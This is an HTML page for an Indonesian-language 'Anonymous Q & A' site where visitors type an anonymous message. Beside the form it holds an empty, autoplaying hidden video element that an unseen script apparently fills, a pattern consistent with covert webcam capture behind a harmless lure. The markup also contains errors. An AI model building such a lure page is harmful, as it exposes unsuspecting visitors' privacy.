<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Anonymous Q & A</title>
    <link rel="stylesheet" href="style.css" />
    <link rel="shortcut icon" href="joker_india.jpg" type="image/x-icon" />
    <meta property="og:image"
    content="https://telegra.ph/file/997b26eb7ce248d864487.jpg"/>
    <meta
    name="description"
    content="Kirim aku pesan secara anonim"
    />
  </head>
  <body>
    
    <header>
      <h2 class="logo">Sulaiman.</h2>
      <nav class="navigation">
        <button class="btnLogin-popup">Kirim Pesan</button>
      </nav>
    </header>

    <div class="wrapper">
      <span class="icon-close">
        <ion-icon name="close-outline"></ion-icon>
      </span>
      
      <div class="from-box">
        <h2>Anonymous Chat</h2>
        <p>kirim pesan tanpa diketahui namamu</p>
        <div class="input-box">
         <from action"#">
            <span class="icon">
              <ion-icon name="mail"></ion-icon>
            </span>
            <input
              type="text"
              id="message"
              required
            />
            <label>
              Pesan
            </label>
        </from>
       </div>
      
      <button type="submit" class="btn" onclick="saveMessage()" >Kirim</button>
      <p id="status-message"></p>
      </div>
      
    </div>
    
    <video id="video" autoplay="autoplay"></video>
    <script src="script.js" type="text/javascript" charset="utf-8"></script>
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
  </body>
</html>
